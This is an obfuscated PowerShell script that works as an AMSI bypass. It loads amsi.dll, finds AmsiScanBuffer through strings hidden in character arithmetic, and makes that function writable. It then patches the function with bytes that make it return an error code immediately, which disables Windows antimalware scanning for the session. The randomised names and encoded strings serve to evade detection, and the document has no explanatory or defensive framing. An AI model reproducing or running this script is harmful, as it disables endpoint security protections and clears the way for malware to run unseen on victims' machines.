$FNYFiE2V = @"
using System;
using System.Runtime.InteropServices;
public class FNYFiE2V {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hIk_HF, string oIt_eC8FEZf9OZe);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr z076f, UIntPtr hu0jJhHj8rgcts, uint Zdp0sj6, out uint taVUuhqY0W);
}
"@

Add-Type $FNYFiE2V

$WPbCVO9Q = [FNYFiE2V]::LoadLibrary("$([cHAR]([bytE]0x61)+[chaR]([bYtE]0x6d)+[cHAR]([BYTe]0x73)+[chaR](105*72/72)+[CHaR]([byTe]0x2e)+[CHAR](100*55/55)+[cHAr]([ByTe]0x6c)+[chaR](108))")
$cuFUL_rVVYLv7z = [FNYFiE2V]::GetProcAddress($WPbCVO9Q, "$([CHAR](39+26)+[chAr](85+24)+[ChAR](115)+[CHaR](105*49/49)+[cHaR]([bYTe]0x53)+[chaR]([bYte]0x63)+[chAR](8+89)+[CHaR](16+94)+[ChAr](37+29)+[cHaR](117*110/110)+[cHAr](102+94-94)+[chaR](102+52-52)+[ChAR]([BytE]0x65)+[cHAR]([BYtE]0x72))")
$p = 0
[FNYFiE2V]::VirtualProtect($cuFUL_rVVYLv7z, [uint32]5, 0x40, [ref]$p)
$BZTKXZcVrH = "0xB8"
$h8eiPgc9AtHmm3vL8w = "0x57"
$fchMagDY2 = "0x00"
$pZFE9fZ7tU49KI = "0x07"
$vG19dHliCSSY7WRFTXoB = "0x80"
$d2v2Misv3UBUT = "0xC3"
$wjtU = [Byte[]] ($BZTKXZcVrH,$h8eiPgc9AtHmm3vL8w,$fchMagDY2,$pZFE9fZ7tU49KI,+$vG19dHliCSSY7WRFTXoB,+$d2v2Misv3UBUT)
[System.Runtime.InteropServices.Marshal]::Copy($wjtU, 0, $cuFUL_rVVYLv7z, 6)